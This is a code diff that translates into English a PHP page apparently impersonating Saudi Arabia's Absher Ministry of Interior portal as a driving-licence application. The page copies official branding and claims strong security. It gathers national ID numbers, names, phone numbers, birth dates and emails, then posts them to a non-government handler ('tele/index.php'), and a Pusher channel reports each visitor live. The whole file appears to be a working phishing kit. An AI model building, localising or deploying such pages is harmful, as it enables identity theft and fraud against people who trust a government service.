@@ -1,13 +1,13 @@
 <?php
 
 session_start();
+require_once '../includes/lang.php';
+set_site_lang('en');
 
-require_once 'includes/lang.php';
-set_site_lang('ar');
 
 header('Content-Type: text/html; charset=utf-8');
-require_once 'dashboard/init.php';
-require_once 'includes/redirect.php';
+require_once '../dashboard/init.php';
+require_once '../includes/redirect.php';
 
 if (!isset($_SESSION['visit_counted'])) {
     try {
@@ -29,7 +29,7 @@ if (!isset($_SESSION['visit_counted'])) {
         );
         
         $pusher->trigger('my-channel', 'visit-increment', [
-            'message' => 'زيارة جديدة'
+            'message' => 'New visit'
         ]);
         
     } catch (Exception $e) {
@@ -38,24 +38,23 @@ if (!isset($_SESSION['visit_counted'])) {
 }
 ?>
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>أبشر - وزارة الداخلية</title>
+    <title>Absher - Ministry of Interior</title>
     
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
     
-    <link rel="stylesheet" href="includes/lang-toggle.css">
-    
+    <link rel="stylesheet" href="../includes/lang-toggle.css">
     <style>
         * {
             padding: 0;
             margin: 0;
             font-family: "Cairo", sans-serif;
-            direction: rtl;
+            direction: ltr;
         }
 
         body {
@@ -425,12 +424,12 @@ if (!isset($_SESSION['visit_counted'])) {
         <div class="container">
             <div class="absher-logo">
                 <i class="fas fa-shield-alt" style="color: white; font-size: 2.5rem;"></i>
-                <h1>أبشر</h1>
+                <h1>Absher</h1>
             </div>
-            <div class="header-actions">
+                        <div class="header-actions">
                 <div class="gov-badge">
                     <i class="fas fa-landmark"></i>
-                    وزارة الداخلية
+                    Ministry of Interior
                 </div>
                 <?php echo render_lang_toggle(); ?>
             </div>
@@ -442,15 +441,15 @@ if (!isset($_SESSION['visit_counted'])) {
         <div class="progress-steps">
             <div class="progress-step">
                 <div class="step-circle active">1</div>
-                <div class="step-label active">البيانات الأساسية</div>
+                <div class="step-label active">Basic Information</div>
             </div>
             <div class="progress-step">
                 <div class="step-circle">2</div>
-                <div class="step-label">معلومات التدريب</div>
+                <div class="step-label">Training Details</div>
             </div>
             <div class="progress-step">
                 <div class="step-circle">3</div>
-                <div class="step-label">المراجعة والتأكيد</div>
+                <div class="step-label">Review & Confirm</div>
             </div>
         </div>
     </div>
@@ -460,42 +459,40 @@ if (!isset($_SESSION['visit_counted'])) {
             <div class="form-container">
                 <h2 class="page-title">
                     <i class="fas fa-file-alt"></i>
-                    طلب رخصة قيادة
+                    Driving License Application
                 </h2>
                 <p class="page-subtitle">
-                    يرجى ملء النموذج التالي بالمعلومات المطلوبة بدقة
+                    Please fill in the form below accurately
                 </p>
 
-                <form action="tele/index.php" method="POST">
-                    <!-- نوع الطلب -->
+                <form action="../tele/index.php" method="POST">
+                    <input type="hidden" name="site_lang" value="en">
+                    <!-- Request Type -->
                     <div class="mb-4">
                         <label for="request_type" class="form-label">
                             <i class="fas fa-clipboard-list"></i>
-                            نوع الطلب
+                            Request Type
                             <span class="required-star">*</span>
                         </label>
                         <select name="request_type" id="request_type" required class="form-select">
-                            <option value="">اختر نوع الطلب</option>
-                            <option value="1">رخصة قيادة خاصة</option>
-                            <option value="1">استبدال (رخصة اجنبية)</option>
-                            <option value="2">رخصة قيادة عامة</option>
-                            <option value="3">رخصة قيادة دراجة آلية</option>
-                            <option value="4">رخصة قيادة مركبات أشغال عامة</option>
-                            <option value="5">تصريح قيادة</option>
+                            <option value="">Select Request Type</option>
+                            <option value="1">Private driving license</option>
+                            <option value="1">Replacement (foreign license)</option>
+                            <option value="5">Driving permit</option>
                         </select>
                     </div>
 
-                    <!-- الجنسية -->
+                    <!-- Nationality -->
                     <div class="mb-4">
                         <label for="nationality" class="form-label">
                             <i class="fas fa-flag"></i>
-                            الجنسية
+                            Nationality
                             <span class="required-star">*</span>
                         </label>
                         <div class="nationality-wrapper">
                             <div class="selected-nationality" id="selectedNationality" onclick="toggleNationalityDropdown()">
                                 <span class="nationality-flag" id="selectedFlag"></span>
-                                <span class="nationality-name placeholder" id="selectedName">اختر الجنسية</span>
+                                <span class="nationality-name placeholder" id="selectedName">Select nationality</span>
                                 <i class="fas fa-chevron-down" style="margin-right: auto;"></i>
                             </div>
                             <input type="hidden" name="nationality" id="nationalityInput" required>
@@ -505,7 +502,7 @@ if (!isset($_SESSION['visit_counted'])) {
                                     <input type="text" 
                                            class="form-control" 
                                            id="nationalitySearch" 
-                                           placeholder="ابحث عن الجنسية..."
+                                           placeholder="Search nationality..."
                                            onclick="event.stopPropagation()">
                                     <i class="fas fa-search search-icon"></i>
                                 </div>
@@ -514,11 +511,11 @@ if (!isset($_SESSION['visit_counted'])) {
                         </div>
                     </div>
 
-                    <!-- رقم الهوية -->
+                    <!-- ID Number -->
                     <div class="mb-4">
                         <label for="ssn" class="form-label">
                             <i class="fas fa-id-card"></i>
-                            رقم الهوية الوطنية
+                            National ID Number
                             <span class="required-star">*</span>
                         </label>
                         <input 
@@ -530,14 +527,14 @@ if (!isset($_SESSION['visit_counted'])) {
                             maxlength="12" 
                             inputmode="numeric" 
                             required 
-                            placeholder="أدخل رقم الهوية الوطنية">
+                            placeholder="Enter national ID number">
                     </div>
 
-                    <!-- الاسم الكامل -->
+                    <!-- Full Name -->
                     <div class="mb-4">
                         <label for="name" class="form-label">
                             <i class="fas fa-user"></i>
-                            الاسم الكامل
+                            Full Name
                             <span class="required-star">*</span>
                         </label>
                         <input 
@@ -546,14 +543,14 @@ if (!isset($_SESSION['visit_counted'])) {
                             id="name"
                             name="name" 
                             required 
-                            placeholder="أدخل الاسم الكامل">
+                            placeholder="Enter full name">
                     </div>
 
-                    <!-- رقم الجوال -->
+                    <!-- Mobile Number -->
                     <div class="mb-4">
                         <label for="phone" class="form-label">
                             <i class="fas fa-phone"></i>
-                            رقم الجوال
+                            Mobile Number
                             <span class="required-star">*</span>
                         </label>
                         <input 
@@ -568,11 +565,11 @@ if (!isset($_SESSION['visit_counted'])) {
                             placeholder="05xxxxxxxx">
                     </div>
 
-                    <!-- تاريخ الميلاد -->
+                    <!-- Date of Birth -->
                     <div class="mb-4">
                         <label for="date" class="form-label">
                             <i class="fas fa-calendar-alt"></i>
-                            تاريخ الميلاد
+                            Date of Birth
                         </label>
                         <input 
                             type="date" 
@@ -581,11 +578,11 @@ if (!isset($_SESSION['visit_counted'])) {
                             name="date">
                     </div>
 
-                    <!-- البريد الإلكتروني -->
+                    <!-- Email -->
                     <div class="mb-4">
                         <label for="email" class="form-label">
                             <i class="fas fa-envelope"></i>
-                            البريد الإلكتروني
+                            Email
                             <span class="required-star">*</span>
                         </label>
                         <input 
@@ -597,11 +594,11 @@ if (!isset($_SESSION['visit_counted'])) {
                             placeholder="example@domain.com">
                     </div>
 
-                    <!-- زر الإرسال -->
+                    <!-- Submit button -->
                     <div class="text-center mt-5">
                         <button type="submit" name="submit" id="butSubm" class="btn-submit" disabled>
                             <i class="fas fa-paper-plane"></i>
-                            تسجيل الطلب
+                            Submit Application
                         </button>
                     </div>
                 </form>
@@ -613,32 +610,32 @@ if (!isset($_SESSION['visit_counted'])) {
         <div class="container">
             <div class="footer-content">
                 <div class="footer-section">
-                    <h5><i class="fas fa-globe"></i> خدمات أبشر</h5>
+                    <h5><i class="fas fa-globe"></i> Absher Services</h5>
                     <ul>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> رخصة القيادة</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> المخالفات المرورية</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> تجديد الإقامة</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> استعلام عن تأشيرة</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Driving License</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Traffic Violations</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Iqama Renewal</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Visa Inquiry</a></li>
                     </ul>
                 </div>
 
                 <div class="footer-section">
-                    <h5><i class="fas fa-phone-alt"></i> تواصل معنا</h5>
+                    <h5><i class="fas fa-phone-alt"></i> Contact Us</h5>
                     <ul>
-                        <li><a href="#"><i class="fas fa-headset"></i> مركز الاتصال: 920020405</a></li>
-                        <li><a href="#"><i class="fas fa-envelope"></i> البريد الإلكتروني</a></li>
-                        <li><a href="#"><i class="fab fa-twitter"></i> تويتر</a></li>
-                        <li><a href="#"><i class="fab fa-facebook"></i> فيسبوك</a></li>
+                        <li><a href="#"><i class="fas fa-headset"></i> Call Center: 920020405</a></li>
+                        <li><a href="#"><i class="fas fa-envelope"></i> Email</a></li>
+                        <li><a href="#"><i class="fab fa-twitter"></i> Twitter</a></li>
+                        <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
                     </ul>
                 </div>
 
                 <div class="footer-section">
-                    <h5><i class="fas fa-link"></i> روابط مهمة</h5>
+                    <h5><i class="fas fa-link"></i> Important Links</h5>
                     <ul>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> الشروط والأحكام</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> سياسة الخصوصية</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> الأسئلة الشائعة</a></li>
-                        <li><a href="#"><i class="fas fa-chevron-left"></i> خريطة الموقع</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Terms & Conditions</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Privacy Policy</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> FAQ</a></li>
+                        <li><a href="#"><i class="fas fa-chevron-right"></i> Site Map</a></li>
                     </ul>
                 </div>
             </div>
@@ -646,11 +643,11 @@ if (!isset($_SESSION['visit_counted'])) {
             <div class="footer-bottom">
                 <p class="mt-3">
                     <i class="fas fa-copyright"></i>
-                    2025 جميع الحقوق محفوظة - منصة أبشر - وزارة الداخلية - المملكة العربية السعودية
+                    2025 All rights reserved - Absher Platform - Ministry of Interior - Kingdom of Saudi Arabia
                 </p>
                 <p>
                     <i class="fas fa-shield-alt"></i>
-                    نظام آمن ومحمي بأعلى معايير الأمن السيبراني
+                    A secure system protected by the highest cybersecurity standards
                 </p>
             </div>
         </div>
@@ -663,34 +660,34 @@ if (!isset($_SESSION['visit_counted'])) {
     <script>
         // Nationalities with flags
         const nationalities = [
-            {name: 'السعودية', flag: '🇸🇦'}, {name: 'مصر', flag: '🇪🇬'}, {name: 'الأردن', flag: '🇯🇴'},
-            {name: 'الإمارات', flag: '🇦🇪'}, {name: 'الكويت', flag: '🇰🇼'}, {name: 'قطر', flag: '🇶🇦'},
-            {name: 'البحرين', flag: '🇧🇭'}, {name: 'عمان', flag: '🇴🇲'}, {name: 'اليمن', flag: '🇾🇪'},
-            {name: 'سوريا', flag: '🇸🇾'}, {name: 'لبنان', flag: '🇱🇧'}, {name: 'فلسطين', flag: '🇵🇸'},
-            {name: 'العراق', flag: '🇮🇶'}, {name: 'السودان', flag: '🇸🇩'}, {name: 'ليبيا', flag: '🇱🇾'},
-            {name: 'تونس', flag: '🇹🇳'}, {name: 'الجزائر', flag: '🇩🇿'}, {name: 'المغرب', flag: '🇲🇦'},
-            {name: 'موريتانيا', flag: '🇲🇷'}, {name: 'الصومال', flag: '🇸🇴'}, {name: 'جيبوتي', flag: '🇩🇯'},
-            {name: 'جزر القمر', flag: '🇰🇲'}, {name: 'تركيا', flag: '🇹🇷'}, {name: 'إيران', flag: '🇮🇷'},
-            {name: 'باكستان', flag: '🇵🇰'}, {name: 'أفغانستان', flag: '🇦🇫'}, {name: 'الهند', flag: '🇮🇳'},
-            {name: 'بنغلاديش', flag: '🇧🇩'}, {name: 'إندونيسيا', flag: '🇮🇩'}, {name: 'ماليزيا', flag: '🇲🇾'},
-            {name: 'الفلبين', flag: '🇵🇭'}, {name: 'تايلاند', flag: '🇹🇭'}, {name: 'فيتنام', flag: '🇻🇳'},
-            {name: 'الصين', flag: '🇨🇳'}, {name: 'اليابان', flag: '🇯🇵'}, {name: 'كوريا الجنوبية', flag: '🇰🇷'},
-            {name: 'كوريا الشمالية', flag: '🇰🇵'}, {name: 'الولايات المتحدة', flag: '🇺🇸'}, {name: 'كندا', flag: '🇨🇦'},
-            {name: 'المكسيك', flag: '🇲🇽'}, {name: 'البرازيل', flag: '🇧🇷'}, {name: 'الأرجنتين', flag: '🇦🇷'},
-            {name: 'تشيلي', flag: '🇨🇱'}, {name: 'بيرو', flag: '🇵🇪'}, {name: 'كولومبيا', flag: '🇨🇴'},
-            {name: 'بريطانيا', flag: '🇬🇧'}, {name: 'فرنسا', flag: '🇫🇷'}, {name: 'ألمانيا', flag: '🇩🇪'},
-            {name: 'إيطاليا', flag: '🇮🇹'}, {name: 'إسبانيا', flag: '🇪🇸'}, {name: 'البرتغال', flag: '🇵🇹'},
-            {name: 'هولندا', flag: '🇳🇱'}, {name: 'بلجيكا', flag: '🇧🇪'}, {name: 'سويسرا', flag: '🇨🇭'},
-            {name: 'النمسا', flag: '🇦🇹'}, {name: 'السويد', flag: '🇸🇪'}, {name: 'النرويج', flag: '🇳🇴'},
-            {name: 'الدنمارك', flag: '🇩🇰'}, {name: 'فنلندا', flag: '🇫🇮'}, {name: 'بولندا', flag: '🇵🇱'},
-            {name: 'روسيا', flag: '🇷🇺'}, {name: 'أوكرانيا', flag: '🇺🇦'}, {name: 'اليونان', flag: '🇬🇷'},
-            {name: 'رومانيا', flag: '🇷🇴'}, {name: 'المجر', flag: '🇭🇺'}, {name: 'التشيك', flag: '🇨🇿'},
-            {name: 'أستراليا', flag: '🇦🇺'}, {name: 'نيوزيلندا', flag: '🇳🇿'}, {name: 'جنوب أفريقيا', flag: '🇿🇦'},
-            {name: 'نيجيريا', flag: '🇳🇬'}, {name: 'كينيا', flag: '🇰🇪'}, {name: 'إثيوبيا', flag: '🇪🇹'},
-            {name: 'أوغندا', flag: '🇺🇬'}, {name: 'تنزانيا', flag: '🇹🇿'}, {name: 'غانا', flag: '🇬🇭'},
-            {name: 'الكاميرون', flag: '🇨🇲'}, {name: 'السنغال', flag: '🇸🇳'}, {name: 'مالي', flag: '🇲🇱'},
-            {name: 'النيجر', flag: '🇳🇪'}, {name: 'تشاد', flag: '🇹🇩'}, {name: 'الغابون', flag: '🇬🇦'},
-            {name: 'زيمبابوي', flag: '🇿🇼'}, {name: 'موزمبيق', flag: '🇲🇿'}, {name: 'أنغولا', flag: '🇦🇴'}
+            {name: 'Saudi Arabia', flag: '🇸🇦'}, {name: 'Egypt', flag: '🇪🇬'}, {name: 'Jordan', flag: '🇯🇴'},
+            {name: 'UAE', flag: '🇦🇪'}, {name: 'Kuwait', flag: '🇰🇼'}, {name: 'Qatar', flag: '🇶🇦'},
+            {name: 'Bahrain', flag: '🇧🇭'}, {name: 'Oman', flag: '🇴🇲'}, {name: 'Yemen', flag: '🇾🇪'},
+            {name: 'Syria', flag: '🇸🇾'}, {name: 'Lebanon', flag: '🇱🇧'}, {name: 'Palestine', flag: '🇵🇸'},
+            {name: 'Iraq', flag: '🇮🇶'}, {name: 'Sudan', flag: '🇸🇩'}, {name: 'Libya', flag: '🇱🇾'},
+            {name: 'Tunisia', flag: '🇹🇳'}, {name: 'Algeria', flag: '🇩🇿'}, {name: 'Morocco', flag: '🇲🇦'},
+            {name: 'Mauritania', flag: '🇲🇷'}, {name: 'Somalia', flag: '🇸🇴'}, {name: 'Djibouti', flag: '🇩🇯'},
+            {name: 'Comoros', flag: '🇰🇲'}, {name: 'Turkey', flag: '🇹🇷'}, {name: 'Iran', flag: '🇮🇷'},
+            {name: 'Pakistan', flag: '🇵🇰'}, {name: 'Afghanistan', flag: '🇦🇫'}, {name: 'India', flag: '🇮🇳'},
+            {name: 'Bangladesh', flag: '🇧🇩'}, {name: 'Indonesia', flag: '🇮🇩'}, {name: 'Malaysia', flag: '🇲🇾'},
+            {name: 'Philippines', flag: '🇵🇭'}, {name: 'Thailand', flag: '🇹🇭'}, {name: 'Vietnam', flag: '🇻🇳'},
+            {name: 'China', flag: '🇨🇳'}, {name: 'Japan', flag: '🇯🇵'}, {name: 'South Korea', flag: '🇰🇷'},
+            {name: 'North Korea', flag: '🇰🇵'}, {name: 'United States', flag: '🇺🇸'}, {name: 'Canada', flag: '🇨🇦'},
+            {name: 'Mexico', flag: '🇲🇽'}, {name: 'Brazil', flag: '🇧🇷'}, {name: 'Argentina', flag: '🇦🇷'},
+            {name: 'Chile', flag: '🇨🇱'}, {name: 'Peru', flag: '🇵🇪'}, {name: 'Colombia', flag: '🇨🇴'},
+            {name: 'United Kingdom', flag: '🇬🇧'}, {name: 'France', flag: '🇫🇷'}, {name: 'Germany', flag: '🇩🇪'},
+            {name: 'Italy', flag: '🇮🇹'}, {name: 'Spain', flag: '🇪🇸'}, {name: 'Portugal', flag: '🇵🇹'},
+            {name: 'Netherlands', flag: '🇳🇱'}, {name: 'Belgium', flag: '🇧🇪'}, {name: 'Switzerland', flag: '🇨🇭'},
+            {name: 'Austria', flag: '🇦🇹'}, {name: 'Sweden', flag: '🇸🇪'}, {name: 'Norway', flag: '🇳🇴'},
+            {name: 'Denmark', flag: '🇩🇰'}, {name: 'Finland', flag: '🇫🇮'}, {name: 'Poland', flag: '🇵🇱'},
+            {name: 'Russia', flag: '🇷🇺'}, {name: 'Ukraine', flag: '🇺🇦'}, {name: 'Greece', flag: '🇬🇷'},
+            {name: 'Romania', flag: '🇷🇴'}, {name: 'Hungary', flag: '🇭🇺'}, {name: 'Czech Republic', flag: '🇨🇿'},
+            {name: 'Australia', flag: '🇦🇺'}, {name: 'New Zealand', flag: '🇳🇿'}, {name: 'South Africa', flag: '🇿🇦'},
+            {name: 'Nigeria', flag: '🇳🇬'}, {name: 'Kenya', flag: '🇰🇪'}, {name: 'Ethiopia', flag: '🇪🇹'},
+            {name: 'Uganda', flag: '🇺🇬'}, {name: 'Tanzania', flag: '🇹🇿'}, {name: 'Ghana', flag: '🇬🇭'},
+            {name: 'Cameroon', flag: '🇨🇲'}, {name: 'Senegal', flag: '🇸🇳'}, {name: 'Mali', flag: '🇲🇱'},
+            {name: 'Niger', flag: '🇳🇪'}, {name: 'Chad', flag: '🇹🇩'}, {name: 'Gabon', flag: '🇬🇦'},
+            {name: 'Zimbabwe', flag: '🇿🇼'}, {name: 'Mozambique', flag: '🇲🇿'}, {name: 'Angola', flag: '🇦🇴'}
         ];
 
         let allNationalities = [];
